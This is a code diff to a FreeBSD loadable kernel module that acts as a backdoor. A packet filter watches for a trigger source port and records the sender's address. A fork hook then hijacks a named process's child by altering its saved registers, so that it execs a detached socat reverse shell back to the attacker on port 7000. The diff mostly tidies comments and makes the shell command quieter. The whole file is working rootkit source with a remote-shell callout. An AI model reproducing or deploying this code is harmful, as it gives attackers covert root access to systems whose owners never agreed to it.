@@ -27,22 +27,20 @@
 #include <sys/unistd.h> // for RFPROC
 #include <sys/imgact.h> // For image_args
 #include <amd64/include/pcb.h> // for pcb struct
-// all the retarded includes for pcb
-#include <amd64/include/fpu.h>
-#include <amd64/include/segments.h>
-#include <amd64/include/tss.h>
-// for curenthread
-#include <sys/pcpu.h>
+#include <amd64/include/fpu.h> // for pcb
+#include <amd64/include/segments.h> // for pcb
+#include <amd64/include/tss.h> // for pcb
+#include <sys/pcpu.h> // for curenthread
 
 
 
-// since BSD is gay as hell and doesn't provide headers for these we declare them as external
-extern int kern_execve(struct thread *td, struct image_args *args, struct mac *mac_p,
-    struct vmspace *oldvmspace);
-
-// Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
+// func not in header file so declare as extern 
+extern int kern_execve(struct thread *td, struct image_args *args, struct mac *mac_p, struct vmspace *oldvmspace);
+// define source port to filter for
 #define TRIGGER_PORT 6969
+// define port that attacker needs to listen on
 #define LISTEN_PORT 7000
+// define the name of the process we will fork and kern_execve() in
 #define TARGET_PROC "apeshit"
 // Global dynamic string for reverse shell
 char reverse_shell_cmd[100];
@@ -54,10 +52,11 @@ static void __stack_chk_fail(void) {
     panic("Kernel stack smashing detected!");
 }
 
+
+
 /*
 custom exec_copyin_args that won't break
 */
-
 static int custom_copin_args_for_exec(struct image_args *args, const char *fname, enum uio_seg segflg, char **argv, char **envv) {
     u_long arg, env;
     int error;
@@ -122,7 +121,7 @@ static int custom_copin_args_for_exec(struct image_args *args, const char *fname
 }
 
 /*
-custom func to call exec shit
+custom func to call kern_execve() 
 */
 static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame) {
 
@@ -131,8 +130,6 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
     // Define command and arguments: /bin/sh -c "echo hello"
     char *argv[] = { "/bin/sh", "-c", reverse_shell_cmd, NULL };
     char *envp[] = { "PATH=/bin:/usr/bin", NULL };  // Basic environment
-
-        // correct signature
 
     error = custom_copin_args_for_exec(&args, argv[0], UIO_SYSSPACE, (char**)&argv, (char**)&envp);
 
@@ -145,7 +142,6 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
     struct thread *curr_td = curthread;  // Macro to get current thread
     printf("Current thread ID: %d\n", curr_td->td_tid);
 
-
     error = kern_execve(curr_td, &args, NULL, NULL);
     if (error != 0) {
         printf("[LKM] kern_execve returned: %d\n", error);
@@ -153,12 +149,10 @@ static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame)
 
 }
 
-
 /*
- * Start of hooking fork and shoving my big fat juicy execve in there
+ * The fork hook that will place kern_execve() in a forked process with a specified name
  * Custom func that will be invoked whenever do_fork() is invoked
 */
-
 static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int flags) {
 
     if (strcmp(parent->p_comm, TARGET_PROC) != 0) {
@@ -174,33 +168,22 @@ static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int
         return;
     }
 
-    // this is the right way to do it but it wayyyyy complicated
     // hijack pcb_rip to point from fork_trampoline to kern_execve()
     struct pcb *pcb2;
     // Get the PCB (Process Control Block) of the child thread 
-    // struct pcb *pcb2 = p2->p_threads.td_pcb; chat alos gave this line idk why its different
     pcb2 = child_td->td_pcb;
     if (pcb2 == NULL) {
         printf("[DEBUG] PCB is NULL, cannot modify it.\n");
         return;
     }
 
-    // this line is causing a kernel panic
-    // this line is causing a kernel panic
-    // this line is causing a kernel panic
-    // we are going to try and do a full fork stack setting this func up correctly
-    // pcb2->pcb_rip = (register_t)func_pcbrip_points_to;
-
-    // testing if its the modification
+    // point to custom execve call instead of fork_return()
     pcb2->pcb_r12 = (register_t)custom_forkret_to_execve;
-
 }
 
 // used to register our func to the kernel
 static eventhandler_tag my_fork_tag;
 // registers custom func to kernel
-// EVENTHANDLER_DIRECT_INVOKE(process_fork, p1, p2, fr->fr_flags);
-// The above line invokes process_fork and below we register to process_fork
 static void load_custom_fork_event_handler(void) {
     my_fork_tag = EVENTHANDLER_REGISTER(process_fork, my_fork_hook, NULL, EVENTHANDLER_PRI_ANY);
     printf("[LKM] process_fork handler registered!\n");
@@ -212,9 +195,9 @@ static void unload_custom_fork_event_handler(void) {
     printf("[LKM] process_fork handler unregistered!\n");
 }
 
-
-
+// helper function to look for our wanted process
 static struct proc *find_process_by_name(const char *name) {
+
     struct proc *p;
 
     sx_slock(&allproc_lock);  // Lock process list
@@ -233,17 +216,18 @@ static struct proc *find_process_by_name(const char *name) {
 }
 
 /*
- * Start of custom packet filtering
  * Global variables to hold references to our head and hook.
  * We need these in order to unlink/unregister them during unload.
  */
 static pfil_head_t g_ph    = NULL;
 static pfil_hook_t g_hook  = NULL;
+
 // Helper function to see if the resource costly <m_pullup()> is needed for pakcet filtering
 static inline int m_pullup_needed(struct mbuf *m, int needed_len) {
     return (m->m_len < needed_len) || ((m->m_next != NULL) && (m->m_pkthdr.len < needed_len));
 }
-// Additional custom packet filter
+
+// custom packet filter
 static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
     struct mbuf *m = *mp;
     struct ip *ip_header;
@@ -299,12 +283,8 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
 
     printf("Kernel IP Address: %s\n", attacker_ip_str);
 
-
-    // make this gloabl
-    // char reverse_shell_cmd[100];
-    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
-       "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, LISTEN_PORT);
-
+    // create the reverse shell command
+    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd), "nohup /usr/local/bin/socat -d -d TCP:%s:%d EXEC:/bin/sh,pty,stderr 2>/dev/null & disown", attacker_ip_str, LISTEN_PORT);
 
     printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
